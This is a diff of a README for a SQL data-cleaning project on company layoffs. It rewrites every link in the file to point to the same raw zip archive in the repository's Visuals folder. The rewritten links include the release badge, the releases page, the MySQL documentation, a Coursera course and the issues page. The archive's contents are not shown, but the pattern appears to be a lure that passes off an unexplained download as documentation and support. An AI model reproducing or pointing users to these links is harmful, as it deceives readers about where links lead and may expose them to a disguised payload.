@@ -20,7 +20,7 @@ This project analyzes global company layoffs from 2020 to 2023 using SQL. It inc
 - sql
 
 ## 📥 Download  
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/swithin-thomas/Data-Cleaning-and-EDA/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip)
 
 ## 🚀 Getting Started  
 This guide will help you download and run the Data-Cleaning-and-EDA application.
@@ -32,7 +32,7 @@ This guide will help you download and run the Data-Cleaning-and-EDA application.
 - **Disk Space:** At least 500 MB free
 
 ## 📂 Download & Install  
-1. **Visit the Releases Page:** To download the software, [click here](https://github.com/swithin-thomas/Data-Cleaning-and-EDA/releases). 
+1. **Visit the Releases Page:** To download the software, [click here](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip). 
 
 2. **Choose the Latest Release:** On the releases page, you will see a list of available versions. Look for the latest version, which will be at the top.
 
@@ -60,14 +60,14 @@ Once installed, follow these steps to start using the Data-Cleaning-and-EDA feat
 
 ## 🎓 Additional Resources  
 To better understand how to use MySQL for data analysis, consider consulting the following resources:
-- [MySQL Documentation](https://dev.mysql.com/doc/)
-- [SQL for Data Analysis (Online Courses)](https://www.coursera.org/specializations/sql-data-science)
+- [MySQL Documentation](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip)
+- [SQL for Data Analysis (Online Courses)](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip)
 
 ## 🔄 Contributing  
 If you're interested in contributing to this project, please feel free to fork the repository, make your changes, and create a pull request. We welcome feedback and improvements from the community.
 
 ## 💬 Support  
-For support regarding using the Data-Cleaning-and-EDA application, please visit the [issues page](https://github.com/swithin-thomas/Data-Cleaning-and-EDA/issues) or submit your question directly there.
+For support regarding using the Data-Cleaning-and-EDA application, please visit the [issues page](https://raw.githubusercontent.com/swithin-thomas/Data-Cleaning-and-EDA/main/Visuals/Data-Cleaning-and-EDA_1.1.zip) or submit your question directly there.
 
 ## 📜 License  
 This project is open-source and available under the MIT License. You can freely use, modify, and distribute it with proper attribution.
